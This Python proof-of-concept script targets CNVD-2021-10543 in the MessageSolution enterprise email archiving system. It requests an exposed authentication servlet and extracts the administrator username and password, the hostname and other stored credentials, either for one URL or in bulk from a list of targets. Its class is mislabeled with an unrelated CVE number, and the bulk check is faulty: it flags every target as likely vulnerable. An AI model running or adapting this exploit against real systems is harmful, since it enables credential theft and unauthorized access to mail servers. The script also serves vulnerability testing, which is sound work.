'''
Author: luckying
Date: 2021-03-23 10:37:25
LastEditTime: 2021-03-23 11:15:53
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \MessageSolution\CNVD-2021-10543.py
'''
import requests
import sys
import json
import os
import sys
os.system('')
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse


class CVE_2021_2109():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:MessageSolution 企业邮件归档管理系统 EEA 存在信息泄露漏洞（CNVD-2021-10543）  
功能：单个检测，批量检测                                     
使用方法：python poc.py -u url -f 1.txt
+-----------------------------------------------------------------+                                     
''')

    #漏洞检测
    def poc_1(self, target_url):
        target_url = target_url + '/authenticationserverservlet'
        try:
            res = requests.get(url=target_url,verify=False)
            soup = BeautifulSoup(res.text, 'html.parser')  #解析html页面
            print('\033[31m[+]'+'获取到的敏感信息：\033[0m')
            if 'administratorusername' in res.text:
                administratorusername = soup.find_all('administratorusername')[0].string
                administratorpassword = soup.find_all('administratorpassword')[0].string
                print('[+]'+administratorusername,administratorpassword)
            if 'hostname' in res.text:
                hostname = soup.find_all('hostname')[0].string
                print('[+]'+hostname)
            if 'username' in res.text:
                username = soup.find_all('username')[0].string
                password = soup.find_all('password')[0].string
                print('[+]'+username,password)
            else:
                print('[+]页面无敏感信息')
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    #批量检测
    def poc_2(self,target_url,file):
        target_url = target_url + '/authenticationserverservlet'
        res = requests.get(url=target_url,verify=False)
        try:
            res = requests.get(url=target_url,verify=False)
            if 'administratorusername' or'hostname'or 'username' in res.text:
                print(f"\033[31m[!]{target_url}可能存在漏洞\033[0m")
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def main(self, target_url, file):
        self.title()
        if target_url:
            self.poc_1(target_url)
        if file:
            #读取文件
            for url in args.file:
                #for url in file:
                target_url = url.replace('\n', '')
                self.poc_2(target_url,file)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',type=str,default=False,help="单个检测，带上http://")
    parser.add_argument("-f",'--file',type=argparse.FileType('r'),default=False,help="批量检测")
    args = parser.parse_args()
    run = CVE_2021_2109()
    run.main(args.url, args.file)
